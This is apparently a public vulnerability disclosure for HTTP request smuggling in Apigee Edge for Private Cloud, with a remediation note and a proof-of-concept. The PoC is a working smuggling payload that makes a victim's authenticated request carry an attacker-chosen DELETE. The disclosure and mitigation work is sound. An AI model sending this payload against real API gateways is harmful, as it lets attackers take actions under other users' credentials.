# Apigee HTTP Request Smuggling
Tested on Edge for Private Cloud v4.19.01

Responsible disclosure have not led to a resolution of the problem within the 90 days.
Despite the confirmation of the vulnerability and a Google VRP bounty it was moved to "Won't fix / Intended behavior" status.
This puts multiple active deployments at risk, this entry serves as a guide on how to mitigate it (i.e. WAF filtering)

## Issue description
Apigee does not properly parse HTTP request length when both `Content-Length` and `Content-Encoding: chunked` are set by the client.
This allows to send requests larger than the assumed size, resulting in appending the overflow data to the next request in the HTTP proxy.
Through such malformed requests attacker can prepend request to the victim issued one, together with original HTTP headers (authorization).
Successful attacks might allow to take actions on behalf of authenticated users, exact impact depend on the API design and functionallity.

This attack is already well explained [here](https://portswigger.net/web-security/request-smuggling), the only difference is that Apigee vulnerability is triggered for `Content-Encoding: chunked` instead of `Transfer-Encoding: chunked`.

## Remediation

The only workaround is to block all requests with `Content-Encoding: chunked` header.
This is not a part of the original HTTP specification and will unlikely be used by any legitimate client.


## PoC - HTTP Request Smuggling

1. Attacker sends multiple requests in order to poison the API proxy:
```
POST /v1/login HTTP/1.1
Host: apigee.proxy-gateway.com
User-Agent: BurpSuite-intruder
Accept-Encoding: gzip, deflate
Accept: application/json
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Encoding: chunked
Content-Length: 108

0

DELETE /v1/resources/SOMETHING_IMPORTANT HTTP/1.1
Injected-Header: attacker-controlled
Dummy-Header: 
```

2. When the legitimate client later sends a HTTP request such as:
```
GET /v1/healthcheck
User-Agent: pingchecker
Authorization: Bearer SoMeAuThToKeNhErE
Accept: application/json

```

3. Result will be the following request issued on victim behalf:
```
DELETE /v1/resources/SOMETHING_IMPORTANT HTTP/1.1
Injected-Header: attacker-controlled
Dummy-Header: GET /v1/healthcheck
User-Agent: pingchecker
Authorization: Bearer SoMeAuThToKeNhErE
Accept: application/json

```

## Limitations

- Poisoning might require an unauthenticated API endpoint which accepts POST method (usually this will be available in authentication)
- HTTP smuggling is limited to method, uri and headers only (not found any way to append request body).

